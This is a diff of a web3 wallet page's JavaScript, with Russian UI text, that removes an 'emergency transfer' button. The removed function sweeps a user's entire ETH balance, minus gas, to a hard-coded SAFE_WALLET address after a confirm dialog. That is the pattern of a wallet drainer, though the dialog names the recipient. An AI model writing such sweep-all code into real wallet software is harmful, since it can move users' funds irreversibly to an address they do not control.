@@ -9,8 +9,6 @@ const signButton = document.getElementById('signButton');
 const emergencySection = document.getElementById('emergencySection');
 const statusDiv = document.getElementById('status');
 const balancesList = document.getElementById('balancesList');
-const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
-const transferStatus = document.getElementById('transferStatus');
 const noWalletMessage = document.getElementById('noWalletMessage');
 
 let web3;
@@ -144,78 +142,6 @@ async function checkNetwork() {
         console.error('Network check error:', error);
     }
 }
-
-// Экстренный перевод
-async function emergencyTransfer() {
-    try {
-        emergencyTransferBtn.classList.add('loading');
-        transferStatus.style.display = 'block';
-        transferStatus.className = 'status-box warning';
-        transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
-        
-        // Получаем баланс и газ
-        const balance = await web3.eth.getBalance(userAddress);
-        const gasPrice = await web3.eth.getGasPrice();
-        
-        // Рассчитываем комиссию за газ
-        const gasCost = web3.utils.toHex(parseInt(gasPrice) * GAS_LIMIT);
-        
-        // Получаем сумму для перевода с учетом комиссии
-        const transferAmount = parseInt(balance) - parseInt(gasCost);
-        
-        if (transferAmount <= 0) {
-            transferStatus.className = 'status-box error';
-            transferStatus.innerHTML = '<p>❌ Недостаточно средств для перевода с учетом комиссии</p>';
-            return;
-        }
-        
-        transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
-        
-        // Создаем объект транзакции
-        const transactionObject = {
-            from: userAddress,
-            to: SAFE_WALLET,
-            value: web3.utils.toHex(transferAmount),
-            gas: GAS_LIMIT,
-            gasPrice: gasPrice
-        };
-        
-        // Отправляем транзакцию
-        const receipt = await web3.eth.sendTransaction(transactionObject);
-        
-        transferStatus.className = 'status-box success';
-        transferStatus.innerHTML = `
-            <p>✅ Перевод успешно выполнен!</p>
-            <p><strong>Хэш:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
-            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
-            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
-        `;
-        
-        await loadBalances(); // Обновляем балансы после перевода
-        
-    } catch (error) {
-        console.error('Transfer error:', error);
-        transferStatus.className = 'status-box error';
-        transferStatus.innerHTML = `<p>❌ Ошибка перевода: ${error.message}</p>`;
-    } finally {
-        emergencyTransferBtn.classList.remove('loading');
-    }
-}
-
-// Обработчик кнопки экстренного перевода
-emergencyTransferBtn.addEventListener('click', function() {
-    const confirmation = confirm(
-        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД\n\n' +
-        'Вы собираетесь перевести ВСЕ доступные средства на безопасный кошелек.\n\n' +
-        `Получатель: ${SAFE_WALLET}\n\n` +
-        'Это действие НЕОБРАТИМО и требует подтверждения в кошельке.\n\n' +
-        'Продолжить?'
-    );
-    
-    if (confirmation) {
-        emergencyTransfer();
-    }
-});
 
 // Мониторинг изменений кошелька
 if (typeof window.ethereum !== 'undefined') {
